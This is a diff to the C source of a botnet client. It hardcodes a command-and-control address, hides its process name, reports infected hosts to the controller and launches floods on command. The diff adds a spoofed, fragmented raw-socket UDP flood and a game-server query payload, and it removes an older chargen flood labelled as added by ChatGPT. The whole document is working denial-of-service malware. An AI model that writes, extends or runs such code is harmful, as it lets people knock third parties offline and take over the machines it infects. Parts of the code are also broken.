@@ -1,4 +1,3 @@
-
 #define PR_SET_NAME 15
 #define SERVER_LIST_SIZE (sizeof(commServer) / sizeof(unsigned char *))
 #define PAD_RIGHT 1
@@ -10,17 +9,24 @@
 #define CMD_DO    253
 #define CMD_DONT  254
 #define OPT_SGA   3
+#define PROTO_GRE 47
+#define GRE_PROTO_IP 0x0800
+#define PROTO_UDPLITE 136
 
-//   _____            _           _
-//   \_   \_ __   ___| |_   _  __| | ___  ___
-//    / /\/ '_ \ / __| | | | |/ _` |/ _ \/ __|
-// /\/ /_ | | | | (__| | |_| | (_| |  __/\__ \
-// \____/ |_| |_|\___|_|\__,_|\__,_|\___||___/
 
+ 
+#define UDP_HDRLEN 8
+#define IP_MAXPACKET 65535
+#define UID_PATH "/etc/.uid"
+#define XOR_KEY "demonkey"
+#define IP4_HDRLEN 20
+#define ICMP_HDRLEN 8
 #include <stdlib.h>
 #include <stdarg.h>
 #include <stdio.h>
-#include <sys/socket.h>
+#include <sys/socket.h>   // for struct iphdr
+#include <arpa/inet.h>     // for inet_addr, htons
+
 #include <sys/types.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
@@ -33,28 +39,17 @@
 #include <fcntl.h>
 #include <errno.h>
 #include <netinet/ip.h>
-#include <netinet/udp.h>
+
 #include <netinet/tcp.h>
 #include <sys/wait.h>
 #include <sys/ioctl.h>
 #include <net/if.h>
-
-//    ___             __ _
-//   / __\___  _ __  / _(_) __ _
-//  / /  / _ \| '_ \| |_| |/ _` |
-// / /__| (_) | | | |  _| | (_| |
-// \____/\___/|_| |_|_| |_|\__, |
-//                         |___/
+#include <pthread.h>
 
 unsigned char *commServer[] =
 {
         "31.58.58.115:666"
-
-//    ___                 _
-//   / __\   _ _ __   ___| |_(_) ___  _ __  ___
-//  / _\| | | | '_ \ / __| __| |/ _ \| '_ \/ __|
-// / /  | |_| | | | | (__| |_| | (_) | | | \__ \
-// \/    \__,_|_| |_|\___|\__|_|\___/|_| |_|___/
+};
 
 int initConnection();
 int getBogos(unsigned char *bogomips);
@@ -63,17 +58,6 @@ int getCountry(unsigned char *buf, int bufsize);
 void makeRandomStr(unsigned char *buf, int length);
 int sockprintf(int sock, char *formatStr, ...);
 char *inet_ntoa(struct in_addr in);
-
-
-// Global configuration (added by ChatGPT)
-int pollinterval = 1000; // Delay interval (used for throttling)
-int spoofit = 32;        // 32 means no spoofing, <32 means subnet spoofing
-int timeEnd = 60;        // Attack duration in seconds
-//    ___ _       _           _
-//   / _ \ | ___ | |__   __ _| |___
-//  / /_\/ |/ _ \| '_ \ / _` | / __|
-// / /_\\| | (_) | |_) | (_| | \__ \
-// \____/|_|\___/|_.__/ \__,_|_|___/
 
 int mainCommSock = 0, currentServer = -1, gotIP = 0;
 uint32_t *pids;
@@ -84,7 +68,10 @@ unsigned char macAddress[6] = {0};
 
 #define PHI 0x9e3779b9
 static uint32_t Q[4096], c = 362436;
-
+struct grehdr {
+    uint16_t flags;
+    uint16_t protocol;
+};
 void init_rand(uint32_t x)
 {
         int i;
@@ -111,12 +98,6 @@ uint32_t rand_cmwc(void)
         }
         return (Q[i] = r - x);
 }
-
-//        _   _ _
-//  /\ /\| |_(_) |___
-// / / \ \ __| | / __|
-// \ \_/ / |_| | \__ \
-//  \___/ \__|_|_|___/
 
 void trim(char *str)
 {
@@ -392,6 +373,7 @@ static const long hextable[] = {
         ['0'] = 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,
         ['A'] = 10, 11, 12, 13, 14, 15,
         ['a'] = 10, 11, 12, 13, 14, 15
+};
 
 long parseHex(unsigned char *hex)
 {
@@ -578,7 +560,7 @@ int negotiate(int sock, unsigned char *buf, int len)
         unsigned char c;
 
         switch (buf[1]) {
-        case CMD_IAC: /*dropped an extra 0xFF wh00ps*/ return 0;
+        case CMD_IAC: return 0;
         case CMD_WILL:
         case CMD_WONT:
         case CMD_DO:
@@ -648,6 +630,8 @@ int readUntil(int fd, char *toFind, int matchLePrompt, int timeout, int timeoutu
         return 0;
 }
 
+static uint8_t ipState[5];
+
 
 in_addr_t getRandomIP(in_addr_t netmask)
 {
@@ -690,20 +674,21 @@ unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph)
         return output;
 }
 
-void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packetSize)
-{
-        iph->ihl = 5;
-        iph->version = 4;
-        iph->tos = 0;
-        iph->tot_len = sizeof(struct iphdr) + packetSize;
-        iph->id = rand_cmwc();
-        iph->frag_off = 0;
-        iph->ttl = MAXTTL;
-        iph->protocol = protocol;
-        iph->check = 0;
-        iph->saddr = source;
-        iph->daddr = dest;
+void makeIPPacket(struct iphdr *iph, uint32_t dest, uint32_t source, uint8_t protocol, int packet_size) {
+    iph->ihl = 5;                           // Internet Header Length (5 * 4 = 20 bytes)
+    iph->version = 4;                      // IPv4
+    iph->tos = 0;                          // Type of Service
+    iph->tot_len = htons(packet_size);    // Total length = headers + data
+    iph->id = htons(rand_cmwc() & 0xFFFF); // Random IP ID
+    iph->frag_off = 0;                     // No fragmentation
+    iph->ttl = 64;                         // Time to Live
+    iph->protocol = protocol;             // IP protocol (UDP, TCP, UDPLite, etc.)
+    iph->check = 0;                        // Checksum (calculated later)
+    iph->saddr = source;                  // Spoofed source IP
+    iph->daddr = dest;                    // Destination IP
+    iph->check = csum((unsigned short *)iph, sizeof(struct iphdr));  // Compute checksum
 }
+
 
 int sclose(int fd)
 {
@@ -711,87 +696,81 @@ int sclose(int fd)
         close(fd);
         return 0;
 }
-void sendUDP_Chargen(unsigned char *target, int port, int duration, int packetsize)
+
+
+
+void setup_udp_header(struct udphdr *udph)
 {
-    struct sockaddr_in dest_addr;
-    dest_addr.sin_family = AF_INET;
-    dest_addr.sin_port = (port == 0 ? rand_cmwc() : htons(port));
-    if (getHost(target, &dest_addr.sin_addr)) return;
-    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
-
-    register unsigned int pollRegister = pollinterval;
-
-    if (spoofit == 32)  // Regular UDP socket
-    {
-        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
-        if (sockfd < 0) {
-            sockprintf(mainCommSock, "Failed opening UDP socket.");
-            return;
-        }
-
-        unsigned char *buf = (unsigned char *)malloc(packetsize + 1);
-        if (!buf) return;
-
-        int j; for (j = 0; j < packetsize; j++)
-            buf[j] = 'A' + (j % 26);  // Chargen-style fill
-
-        int end = time(NULL) + timeEnd;
-        register unsigned int i = 0;
-        while (time(NULL) <= end) {
-            sendto(sockfd, buf, packetsize, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
-
-            if (++i >= pollRegister) {
-                if (port == 0) dest_addr.sin_port = rand_cmwc();
-                i = 0;
-            }
-        }
-
-        close(sockfd);
-        free(buf);
-    }
-    else  // Raw socket with spoofing
-    {
-        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
-        if (sockfd < 0) {
-            sockprintf(mainCommSock, "Failed opening raw socket.");
-            return;
-        }
-
-        int tmp = 1;
-        if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
-            sockprintf(mainCommSock, "Failed setting IP_HDRINCL.");
-            return;
-        }
-
-        in_addr_t netmask = spoofit == 0 ? ~((in_addr_t)0) : ~((1 << (32 - spoofit)) - 1);
-        struct iphdr *iph = (struct iphdr *)packet;
-
-        int j; for (j = 0; j < packetsize; j++)
-            data[j] = 'A' + (j % 26);  // Chargen-style fill
-
-        int end = time(NULL) + timeEnd;
-        register unsigned int i = 0;
-
-        while (time(NULL) <= end) {
-
-            udph->source = rand_cmwc();
-            udph->dest = (port == 0 ? rand_cmwc() : htons(port));
-            udph->check = 0;
-
-            iph->check = 0;
-            iph->check = csum((unsigned short *)iph, sizeof(struct iphdr));
-
-            sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
-
-            if (++i >= pollRegister) {
-                i = 0;
-            }
-        }
-
-        close(sockfd);
-    }
+        udph->source = htons(27015);
+    udph->dest = htons(27015);
+    udph->check = 0;
+        void *data = (void *)udph + sizeof(struct udphdr);
+        memset(data, 0xFF, 4);
+        strcpy(data+4, "TSource Engine Query");
+    udph->len=htons(sizeof(struct udphdr) + 25);
 }
+ 
+void sendUDP_Fragmented(unsigned char *target, int port, int duration, int packetsize)
+{
+    struct sockaddr_in dest;
+    dest.sin_family = AF_INET;
+    dest.sin_port = htons(port);
+    if (getHost(target, &dest.sin_addr)) return;
+    memset(dest.sin_zero, 0, sizeof(dest.sin_zero));
 
+    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (sockfd < 0) {
+        perror("socket");
+        return;
+    }
+
+    int tmp = 1;
+    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
+        perror("setsockopt");
+        close(sockfd);
+        return;
+    }
+
+    // Set fragment size (must be multiple of 8 bytes for IP fragmentation)
+    const int frag_payload_size = 1480;  // common MTU-safe size
+    const int total_data_len = packetsize;
+    const int num_frags = (total_data_len + frag_payload_size - 1) / frag_payload_size;
+
+    unsigned char packet[4096];
+    memset(packet, 0, sizeof(packet));
+
+    int end_time = time(NULL) + duration;
+
+    while (time(NULL) <= end_time) {
+        for (int i = 0; i < num_frags; i++) {
+            struct iphdr *iph = (struct iphdr *)packet;
+            int data_offset = sizeof(struct iphdr);
+            int frag_len = (i < num_frags - 1) ? frag_payload_size : (total_data_len - i * frag_payload_size);
+
+            // Fill payload with chargen-style data
+            for (int j = 0; j < frag_len; j++) {
+                packet[data_offset + j] = 'A' + (j % 26);
+            }
+
+            iph->ihl = 5;
+            iph->version = 4;
+            iph->tos = 0;
+            iph->tot_len = htons(sizeof(struct iphdr) + frag_len);
+            iph->id = htons(rand_cmwc() & 0xFFFF);
+            iph->frag_off = htons((i * (frag_payload_size / 8)) | (i < num_frags - 1 ? 0x2000 : 0)); // MF flag
+            iph->ttl = 64;
+            iph->protocol = IPPROTO_UDP;
+            iph->check = 0;
+            iph->saddr = htonl(getRandomIP(~0));
+            iph->daddr = dest.sin_addr.s_addr;
+            iph->check = csum((unsigned short *)packet, sizeof(struct iphdr) / 2);
+
+            sendto(sockfd, packet, sizeof(struct iphdr) + frag_len, 0, (struct sockaddr *)&dest, sizeof(dest));
+        }
+    }
+
+    close(sockfd);
+}
 void makeSystemUID(unsigned char *uid, int size) {
     unsigned char bogomips[16];
     memset(bogomips, 0, sizeof(bogomips));
@@ -799,49 +778,30 @@ void makeSystemUID(unsigned char *uid, int size) {
     snprintf((char *)uid, size, "%s-%s", inet_ntoa(ourIP), bogomips);
 }
 
+
+
+
+
+
 void processCmd(int argc, unsigned char *argv[])
 {
-    if (!strcmp(argv[0], "PING")) {
-        sockprintf(mainCommSock, "PONG!");
-        return;
-    }
-
-    if (!strcmp(argv[0], "GETLOCALIP")) {
-        sockprintf(mainCommSock, "My IP: %s", inet_ntoa(ourIP));
-        return;
-    }
-
-    if (!strcmp(argv[0], "FRAG")) {
-        if (argc < 5 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[4]) < 1 || atoi(argv[4]) > 4096) {
-            return;
+	int x;
+        if(!strcmp(argv[0], "PING"))
+        {
+                sockprintf(mainCommSock, "PONG!");
+                return;
         }
 
-        unsigned char *ip = argv[1];
-        int port = atoi(argv[2]);
-        int time = atoi(argv[3]);
-        int packetsize = atoi(argv[4]);
-
-        if (strstr((char *)ip, ",") != NULL) {
-            unsigned char *hi = strtok((char *)ip, ",");
-            while (hi != NULL) {
-                if (!listFork()) {
-                    sendUDP_Fragmented(hi, port, time, packetsize);
-                    _exit(0);
-                }
-                hi = strtok(NULL, ",");
-            }
-        } else {
-            if (listFork()) return;
-            sendUDP_Fragmented(ip, port, time, packetsize);
-            _exit(0);
+        if(!strcmp(argv[0], "GETLOCALIP"))
+        {
+                sockprintf(mainCommSock, "My IP: %s", inet_ntoa(ourIP));
+                return;
         }
-    }
-}
 
-if (!strcmp(argv[0], "CHA"))
+        if (!strcmp(argv[0], "FRAG"))
 {
-    if (argc < 5 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[4]) < 1 || atoi(argv[4]) > 65500) {
-        //sockprintf(mainCommSock, "Usage: UDPCHARGEN <target> <port> <time> <packet size>");
+    if (argc < 5 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[4]) < 1 || atoi(argv[4]) > 4096) {
+        //sockprintf(mainCommSock, "Usage: UDPFRAG <target> <port> <time> <packet size>");
         return;
     }
 
@@ -854,18 +814,18 @@ if (!strcmp(argv[0], "CHA"))
         unsigned char *hi = strtok((char *)ip, ",");
         while (hi != NULL) {
             if (!listFork()) {
-                sendUDP_Chargen(hi, port, time, packetsize);
+                sendUDP_Fragmented(hi, port, time, packetsize);
                 _exit(0);
             }
             hi = strtok(NULL, ",");
         }
     } else {
         if (listFork()) return;
-        sendUDP_Chargen(ip, port, time, packetsize);
+        sendUDP_Fragmented(ip, port, time, packetsize);
         _exit(0);
     }
 }
-
+     
 	if(!strcmp(argv[0], "KILLATTK"))
         {
                 int killed = 0;
@@ -879,9 +839,7 @@ if (!strcmp(argv[0], "CHA"))
 
                 if(killed > 0)
                 {
-                        //sockprintf(mainCommSock, "Killed %d.", killed);
                 } else {
-                        //sockprintf(mainCommSock, "None Killed.");
                 }
         }
 
@@ -975,7 +933,7 @@ char *getBuild()
 	#elif PPC_BUILD
 	return "POWERPC";
 	#else
-	return "ART OF WAR";
+	return "POOLE";
 	#endif
 }
 
@@ -983,18 +941,18 @@ int main(int argc, unsigned char *argv[])
 {
         char *mynameis = "";
         if(SERVER_LIST_SIZE <= 0) return 0;
-	printf("BUILD %s\n", getBuild());
-	strncpy(argv[0],"",strlen(argv[0]));
+		printf("BUILD %s\n", getBuild());
+		strncpy(argv[0],"",strlen(argv[0]));
     	argv[0] = "";
     	prctl(PR_SET_NAME, (unsigned long) mynameis, 0, 0, 0);
-	srand(time(NULL) ^ getpid());
+		srand(time(NULL) ^ getpid());
         init_rand(time(NULL) ^ getpid());
         pid_t pid1;
         pid_t pid2;
         int status;
 
         getOurIP();
-    
+
         if (pid1 = fork()) {
                         waitpid(pid1, &status, 0);
                         exit(0);
@@ -1003,10 +961,8 @@ int main(int argc, unsigned char *argv[])
                                         exit(0);
                         } else if (!pid2) {
                         } else {
-                                        //zprintf("fork failed\n");
                         }
         } else {
-                        //zprintf("fork failed\n");
         }
 
         setsid();
@@ -1018,10 +974,11 @@ int main(int argc, unsigned char *argv[])
         {
                 if(initConnection()) { sleep(5); continue; }
 
-		sockprintf(mainCommSock, "\x1b[34m[ CONNECTED ] IP: %s [ BUILD: %s", inet_ntoa(ourIP), getBuild());
+		sockprintf(mainCommSock, "[ CONNECTED ] IP: %s", inet_ntoa(ourIP));
               unsigned char uid[64];
               makeSystemUID(uid, sizeof(uid));
-sockprintf(mainCommSock, "[UID] %s", uid);
+              sockprintf(mainCommSock, "UID %s", uid);
+
                 char commBuf[4096];
                 int got = 0;
                 int i = 0;
@@ -1082,7 +1039,6 @@ sockprintf(mainCommSock, "[UID] %s", uid);
                                         while(fdgets(buf, 1024, command) != NULL)
                                         {
                                                 trim(buf);
-//                                                sockprintf(mainCommSock, "%s", buf);
                                                 memset(buf, 0, 1024);
                                                 sleep(1);
                                         }
@@ -1119,8 +1075,8 @@ sockprintf(mainCommSock, "[UID] %s", uid);
                                 }
                         }
                 }
-                //printf("Link closed by server.\n");
         }
 
         return 0;
 }
+
